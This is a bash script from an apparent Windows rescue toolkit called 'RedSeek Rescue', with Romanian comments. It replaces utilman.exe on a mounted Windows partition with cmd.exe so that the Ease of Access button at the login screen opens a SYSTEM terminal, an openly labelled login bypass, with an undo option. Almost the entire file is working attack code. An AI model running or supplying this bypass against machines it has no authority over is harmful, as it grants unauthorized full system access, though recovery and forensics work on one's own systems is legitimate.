#!/usr/bin/env bash
# Copyright (c) 2026 Rednic Vasile
# Licensed under the MIT License. See LICENSE file in the project root for full license information.

# RedSeek Rescue - utilman-hack.sh
# Înlocuiește butonul de Accesibilitate cu cmd.exe (bypass login)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
source "${SCRIPT_DIR}/utils.sh"

require_root

REAL_SYSTEM32=$(find_ci "$MOUNT_BASE" "Windows/System32")

if [ -z "$REAL_SYSTEM32" ]; then
    log_error "System32 nu a fost găsit. Este Windows-ul montat?"
    exit 1
fi

# Backup persistent direct pe partiția Windows — supraviețuiește reboot-urilor
BACKUP_FILE="${REAL_SYSTEM32}/utilman.exe.redseek.bak"

hack() {
    if [ ! -f "${REAL_SYSTEM32}/utilman.exe" ]; then
        log_error "utilman.exe nu există."
        exit 1
    fi

    # Nu suprascriem un backup existent (protejează executabilul original)
    if [ -f "$BACKUP_FILE" ]; then
        log_warn "Un backup persistent există deja. Hack-ul este probabil activat."
    else
        cp "${REAL_SYSTEM32}/utilman.exe" "$BACKUP_FILE"
        log_success "Backup persistent salvat pe disc: $BACKUP_FILE"
    fi

    cp "${REAL_SYSTEM32}/cmd.exe" "${REAL_SYSTEM32}/utilman.exe"
    log_success "utilman.exe înlocuit cu cmd.exe"

    echo ""
    echo -e "${YELLOW}La login: click pe Ease of Access (Accesibilitate) pentru terminal SYSTEM${NC}"
}

undo() {
    if [ -f "$BACKUP_FILE" ]; then
        mv "$BACKUP_FILE" "${REAL_SYSTEM32}/utilman.exe"
        log_success "utilman.exe original a fost restaurat cu succes."
    else
        log_error "Nu s-a găsit niciun backup persistent ($BACKUP_FILE) pe această instalare de Windows."
        exit 1
    fi
}

case "${1:-hack}" in
    hack)  hack ;;
    undo)  undo ;;
    *)
        echo "Folosire:"
        echo "  utilman-hack.sh       — înlocuiește utilman.exe cu cmd.exe"
        echo "  utilman-hack.sh undo  — restaurează originalul"
        ;;
esac
